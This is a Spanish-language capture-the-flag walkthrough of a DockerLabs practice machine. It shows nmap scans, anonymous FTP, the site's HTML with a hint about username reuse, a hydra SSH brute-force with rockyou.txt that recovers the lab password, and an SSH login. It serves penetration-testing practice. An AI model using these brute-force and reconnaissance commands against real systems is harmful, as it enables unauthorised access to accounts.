# MAQUINA OBSESSION

## INICION ESCANEO

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:47 CEST
Initiating ARP Ping Scan at 21:47
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:47, 0.08s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:47
Scanning 172.17.0.2 [65535 ports]
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:47, 0.54s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-08-31 21:47:08 CEST for 0s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:49 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000042s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:50 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:50 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000056s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Russoski Coaching
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds

## ANALISIS DE CODIGO DE LA PAGINA MONTADA SOBRE EL PUERTO 80

>curl -X GET http://172.17.0.2 | js-beautify

< !DOCTYPE html >
    <
    html lang = "en" >

    <
    head >
    <
    meta charset = "utf-8" >
    <
    title > Russoski Coaching < /title> <
    link rel = "stylesheet"
href = "style.css" >
    <
    /head>

    <
    body >
    <
    section class = "full" >
    <
    div class = "full-inner" >
    <
    div class = "content" >
    <
    h1 > The Aesthetic Dream < /h1> <
    a href = "#formulario" > TRANSFORMA TU FÍSICO YA MISMO < /a> <
    /div> <
    /div> <
    /section> <
    p > Bienvenido.Soy Informático, pero sobre todo, soy < strong > entrenador personal < /strong> con más de 5
años de experiencia en el entrenamiento con cargas y nutrición, con < strong > certificado de
profesionalidad < /strong> como Monitor de Musculación y Fitness. Para conocerme un poco más, <a href="https:/ / russ0ski.github.io / MyHackingRoad / "
target = "_blank" > entra aquí < /a>.</p >
    <
    p > Estoy dispuesto a utilizar todos mis conocimientos con el objetivo de < strong > cambiar tu físico para
bien < /strong>. ¿Estás dispuesto a conseguir tu mejor versión y vivir la vida que siempre quisiste?. <
    strong > Sólo tienes que dar el paso < /strong> y dejarme asesorarte en tu camino hacía la <
    strong > estética < /strong>. <
    /p> <
    p > Aprovecha mi nueva oferta por < strong > Black Friday < /strong> y obtén un 45% de descuento durante los próximos 3
meses en tus planes de nutrición y entrenamiento, sólo disponible por < strong > tiempo limitado < /strong>.
Atrévete, no te arrepentirás < strong > cuando te mires al espejo y sonrías < /strong>.</p >
    <
    section class = "full4" >
    <
    div class = "full-inner4" >
    <
    div class = "content5" >
    <
    ul >
    <
    li >
    Resultados 100 % garantizados, si no estás conforme te devolvemos parte del dinero. <
    /li> <
    li >
    La primera semana de prueba es gratuita, sólo tienes que rellenar nuestro formulario. <
    /li> <
    li >
    Asesoramiento online y también presencial(sólo aplicable si eres mujer). <
    /li> <
    li >
    Me adapto a tu nivel físico para brindarte el mejor servicio, sin riesgo de lesiones. <
    /li> <
    li >
    Me adapto a tu economía para ofrecer el mejor plan de nutrición que puedas permitirte. <
    /li> <
    /ul> <
    /div>          <
    /div>         <! -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente --> <
    /section> <
    section class = "full3" >
    <
    div class = "full-inner3" >
    <
    div class = "content3" >
    <
    fieldset >
    <
    a id = "formulario" >
    <
    h3 > Consigue tu asesoría personalizada: < /h3> <
    /a> <
    form action = "http://172.17.0.2/.formrellyrespexit.html"
method = "get" >
    <
    label >
    Nombre:
    <
    input name = "nombre"
type = "text"
placeholder = "Introduce tu nombre" / >
    <
    /label> <
    br >
    <
    br >
    <
    label >
    Apellido:
    <
    input name = "apellido"
type = "text"
placeholder = "Introduce tus apellidos" / >
    <
    /label> <
    br >
    <
    br >
    <
    label >
    Teléfono:
    <
    input name = "telefono"
type = "tel"
placeholder = "Introduce tu número" / >
    <
    /label> <
    br >
    <
    br >
    <
    label >
    Email:
    <
    input name = "email"
type = "email"
placeholder = "Introduce tu correo" / >
    <
    /label> <
    br >
    <
    br >
    <
    label
for = "somatotipo" > Somatotipo: < /label> <
    select name = "somatotipo" >
    <
    option > Hectomorfo < /option> <
    option > Mesomorfo < /option> <
    option > Endomorfo < /option> <
    /select> <
    br >
    <
    br >
    <
    input name = "llamada a la accion"
type = "submit"
value = "CAMBIAR MI VIDA A MEJOR AHORA" / >
    <
    input name = "campaign"
type = "hidden"
value = "BLACKFRIDAY" / >
    <
    /form> <
    br >
    <
    /fieldset> <
    /div> <
    /div> <
    /section> <
    footer >
    <
    section class = "full2" >
    <
    div class = "full-inner2" >
    <
    div class = "content4" >
    <
    br >
    <
    h4 > Copyright Russoski© 2024 < /h4> <
    a href = "mailto:russoski@dockerlabs.es"
target = "_blank" > russoski @dockerlabs.es < /a> <
    br >
    <
    br >
    <
    br >
    <
    /div> <
    /div> <
    /section> <
    /footer> <
    /body>

    <
    /html><

>EL USUARIO "RUSSOSKI" ESTA COMO USUARIO EN VARIAS PARTES DE LA MAQUINA

## INTENTO DE INGRESO POR EL PUERTO 22 POR FUERZA BRUTA

>hydra -l russoski -P /home/mateo/Descargas/rockyou.txt ssh://172.17.0.2 -s 22 -t 4


Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-31 22:06:48
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-31 22:10:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-31 22:11:07
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-31 22:11:31
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-31 22:14:53
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 65.00 tries/min, 65 tries in 00:01h, 14344333 to do in 3678:03h, 4 active
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-31 22:16:42

- LOGIN DE SSH ENCONTRADO "russoski": 
- PASS DE SSH ENCONTRADA "iloveme"

## CONECTION A LA MAQUINA VICTIMA POR SSH 

>ssh russoski@172.17.0.2 -p 22

russoski@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

- Documentation:  https://help.ubuntu.com
- Management:     https://landscape.canonical.com
- Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Aug 31 21:38:28 2025 from 172.17.0.1
russoski@836e293003f5:~$ ls
Documentos  Proyectos
russoski@836e293003f5:~$ cd Proyectos/
russoski@836e293003f5:~/Proyectos$ ls
README.md  Strong-Credentials.py
russoski@836e293003f5:~/Proyectos$ python3 Strong-Credentials.py 
-> Tu Contraseña generada es: nADIdPm¿f[q]]4g3GRNv
